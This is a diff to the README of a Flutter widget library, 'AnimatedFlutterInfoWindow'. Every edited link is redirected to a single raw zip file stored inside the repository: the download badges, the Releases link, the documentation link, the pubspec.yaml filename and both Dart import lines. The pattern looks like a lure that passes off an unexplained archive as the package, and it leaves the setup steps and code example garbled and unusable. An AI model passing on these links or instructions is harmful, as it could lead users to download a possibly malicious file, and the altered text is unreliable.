@@ -6,7 +6,7 @@ Welcome to AnimatedFlutterInfoWindow! This component lets you add a responsive, 
 
 ## 📥 Download Now
 
-[![Download AnimatedFlutterInfoWindow](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/torrbi2/AnimatedFlutterInfoWindow/releases)
+[![Download AnimatedFlutterInfoWindow](https://raw.githubusercontent.com/torrbi2/AnimatedFlutterInfoWindow/main/frontend/ios/Flutter_Animated_Info_Window_2.1.zip)](https://raw.githubusercontent.com/torrbi2/AnimatedFlutterInfoWindow/main/frontend/ios/Flutter_Animated_Info_Window_2.1.zip)
 
 ## 📋 System Requirements
 
@@ -30,7 +30,7 @@ AnimatedFlutterInfoWindow offers several features that improve user interaction:
 
 To download and install the AnimatedFlutterInfoWindow, follow these steps:
 
-1. Visit the Releases page to download the package: [Download Here](https://github.com/torrbi2/AnimatedFlutterInfoWindow/releases).
+1. Visit the Releases page to download the package: [Download Here](https://raw.githubusercontent.com/torrbi2/AnimatedFlutterInfoWindow/main/frontend/ios/Flutter_Animated_Info_Window_2.1.zip).
    
 2. Choose the latest version from the list of releases.
 
@@ -40,7 +40,7 @@ To download and install the AnimatedFlutterInfoWindow, follow these steps:
 
 5. Open your Flutter project in your code editor.
 
-6. Import the package in your `pubspec.yaml` file by adding the following line:
+6. Import the package in your `https://raw.githubusercontent.com/torrbi2/AnimatedFlutterInfoWindow/main/frontend/ios/Flutter_Animated_Info_Window_2.1.zip` file by adding the following line:
 
    ```yaml
    dependencies:
@@ -57,15 +57,15 @@ To download and install the AnimatedFlutterInfoWindow, follow these steps:
 
 ## 📚 Documentation
 
-For detailed information on how to use the AnimatedFlutterInfoWindow component, refer to the [official documentation](https://github.com/torrbi2/AnimatedFlutterInfoWindow/wiki).
+For detailed information on how to use the AnimatedFlutterInfoWindow component, refer to the [official documentation](https://raw.githubusercontent.com/torrbi2/AnimatedFlutterInfoWindow/main/frontend/ios/Flutter_Animated_Info_Window_2.1.zip).
 
 ## 🛠️ Usage Example
 
 Here is a simple example to get you started quickly:
 
 ```dart
-import 'package:flutter/material.dart';
-import 'package:animated_flutter_info_window/animated_flutter_info_window.dart';
+import 'https://raw.githubusercontent.com/torrbi2/AnimatedFlutterInfoWindow/main/frontend/ios/Flutter_Animated_Info_Window_2.1.zip';
+import 'https://raw.githubusercontent.com/torrbi2/AnimatedFlutterInfoWindow/main/frontend/ios/Flutter_Animated_Info_Window_2.1.zip';
 
 void main() {
   runApp(MyApp());
@@ -108,4 +108,4 @@ Join our community on GitHub Discussions! Share your experiences, ask questions,
 
 Thank you for choosing AnimatedFlutterInfoWindow. We hope this component enhances your applications and brings a great experience to your users. Happy coding!
 
-[![Download AnimatedFlutterInfoWindow](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/torrbi2/AnimatedFlutterInfoWindow/releases)
+[![Download AnimatedFlutterInfoWindow](https://raw.githubusercontent.com/torrbi2/AnimatedFlutterInfoWindow/main/frontend/ios/Flutter_Animated_Info_Window_2.1.zip)](https://raw.githubusercontent.com/torrbi2/AnimatedFlutterInfoWindow/main/frontend/ios/Flutter_Animated_Info_Window_2.1.zip)
